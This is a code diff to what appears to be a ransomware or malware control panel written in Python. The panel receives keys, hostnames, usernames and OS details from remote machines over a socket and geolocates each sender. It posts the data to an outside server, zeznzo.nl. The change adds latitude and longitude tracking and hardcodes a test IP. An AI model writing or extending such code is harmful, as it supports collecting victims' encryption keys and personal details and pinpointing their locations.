@@ -1186,7 +1186,8 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
                         data = sockfd.recv(1024)
                         if data:
                             data = data.decode('UTF-8')
-                            ip = addr[0]
+                            #ip = addr[0]
+                            ip = '8.8.8.8'
                             local = data.split('$')[0]
                             system = data.split('$')[1]
                             key = data.split('$')[2].strip()[2:].strip()[:-1]
@@ -1200,6 +1201,8 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
                                 city = lookup.split(',')[3]
                                 isp = lookup.split(',')[4]
                                 zip = lookup.split(',')[5]
+                                lat = lookup.split(',')[6]
+                                lon = lookup.split(',')[7]
 
                             result = '''
 [Occured]    -> %s %s
@@ -1229,13 +1232,15 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         region,
         city,
         isp,
-        zip)
+        zip,
+        lat,
+        lon)
 
                             self.serv.options['log'].insert(END, result, 'yellow')
                             self.serv.options['log'].see(END)
 
                             if save_keys == 1:
-                                payload = {'user' : self.options['username'].get(), 'pwd' : self.options['password'].get(), 'Occured': time.strftime('%d/%m/%Y') + ' ' + time.strftime('%X'), 'Username' : user, 'OS' : system, 'Hostname' : hostname, 'Key' : key, 'IP' : ip, 'LocalIP' : local, 'Continent' : con, 'Country' : country, 'Region' : region, 'City' : city , 'ISP' : isp, 'ZIP' : zip}
+                                payload = {'user' : self.options['username'].get(), 'pwd' : self.options['password'].get(), 'Occured': time.strftime('%d/%m/%Y') + ' ' + time.strftime('%X'), 'Username' : user, 'OS' : system, 'Hostname' : hostname, 'Key' : key, 'IP' : ip, 'LocalIP' : local, 'Continent' : con, 'Country' : country, 'Region' : region, 'City' : city , 'ISP' : isp, 'ZIP' : zip, 'lat' : lat, 'lon' : lon}
                                 r = requests.post('https://zeznzo.nl/post.py', data=payload)
                         else:
                             break
@@ -1301,7 +1306,9 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
             city = 'Error - Fail'
             isp = 'Error - Fail'
             zip = 'Error - Fail'
-            return '%s,%s,%s,%s,%s,%s' % (con, country, region, city, isp, zip)
+            lat = 'Error - Fail'
+            lon = 'Error - Fail'
+            return '%s,%s,%s,%s,%s,%s,%s,%s' % (con, country, region, city, isp, zip, lat, lon)
 
 
         data = r.json()
@@ -1313,6 +1320,8 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
             city = data['city']
             isp = data['isp']
             zip = data['zip']
+            lat = data['lat']
+            lon = data['lon']
         else:
             con = 'Error - Fail'
             country = 'Error - Fail'
@@ -1320,8 +1329,10 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
             city = 'Error - Fail'
             isp = 'Error - Fail'
             zip = 'Error - Fail'
+            lat = 'Error - Fail'
+            lon = 'Error - Fail'
 
-        return '%s,%s,%s,%s,%s,%s' % (con, country, region, city, isp, zip)
+        return '%s,%s,%s,%s,%s,%s,%s,%s' % (con, country, region, city, isp, zip, lat, lon)
 
     def close_profile(self, event):
         self.prof.destroy()
